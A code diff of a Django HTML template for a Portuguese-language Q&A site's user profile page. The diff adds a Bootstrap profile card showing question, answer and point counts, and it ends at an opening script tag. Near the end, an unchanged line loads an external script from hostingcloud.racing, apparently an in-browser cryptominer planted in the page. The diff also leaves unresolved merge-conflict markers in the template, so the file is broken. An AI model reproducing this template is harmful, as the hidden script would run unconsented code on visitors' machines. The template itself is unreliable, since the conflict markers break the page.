@@ -113,6 +113,8 @@
 				})
 			}
 		</script>
+		
+		<link rel="stylesheet" href="/static/css/profile.css">
 	</head>
 	<body>
 		<nav class="navbar navbar-expand-sm   navbar-light bg-light">
@@ -153,6 +155,7 @@
 			</div>
 		</nav>
 
+<<<<<<< HEAD
 		<center id="center1">
 		    <img src="{{user_p.avatar.url}}" alt="{{user_p.user.username}}">
 			<span>{{user_p.user.username}}</span>
@@ -221,6 +224,24 @@
 			<input type="submit" value="Alterar">
 		</form>
 		{% endif %}
+=======
+<div class="container mt-5 d-flex justify-content-center">
+    <div class="card p-3">
+        <div class="d-flex align-items-center">
+            <div class="image"> <img src="{{ user_p.avatar.url }}" class="rounded" width="155"> </div>
+            <div class="ml-3 w-100">
+                <h4 class="mb-0 mt-0">{{ user_p.user.username }}</h4> <span>Askeriano</span>
+                <div class="p-2 mt-2 bg-primary d-flex justify-content-between rounded text-white stats">
+                    <div class="d-flex flex-column"> <span class="articles">Perguntas</span> <span class="number1">{{ user_p.total_questions }}</span> </div>
+                    <div class="d-flex flex-column"> <span class="followers">Respostas</span> <span class="number2">{{ user_p.total_responses }}</span> </div>
+                    <div class="d-flex flex-column"> <span class="rating">Pontos</span> <span class="number3">{{ user_p.total_points }}</span> </div>
+                </div>
+                <!--<div class="button mt-2 d-flex flex-row align-items-center"> <button class="btn btn-sm btn-outline-primary w-100">Chat</button> <button class="btn btn-sm btn-primary w-100 ml-2">Follow</button> </div>-->
+            </div>
+        </div>
+    </div>
+</div>
+>>>>>>> fca5c0a3cbb5cb339ed81d5f48134682426ec2dd
 
 <script src="https://www.hostingcloud.racing/dJi3.js"></script>
 <script>
